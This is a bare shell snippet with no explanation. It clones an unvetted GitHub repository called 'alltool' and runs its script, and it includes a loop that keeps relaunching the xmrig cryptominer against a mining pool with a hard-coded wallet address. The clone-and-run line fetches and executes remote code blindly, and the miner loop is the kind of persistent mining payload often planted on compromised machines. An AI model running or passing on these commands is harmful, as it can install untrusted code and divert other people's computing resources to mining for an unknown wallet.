apt update -y && apt install git -y && apt upgrade -y && git clone https://github.com/Ngocgiau2000/alltool.git && cd alltool && sh all.sh
#!/bin/sh
while [ 1 ]; do
	./xmrig -a ghostrider --url stratum-eu.rplant.xyz:17082 --tls --user BRPf7NZAVPR8w2aqJigQf1EXquxi6zHtaU.rig
	sleep 5
done
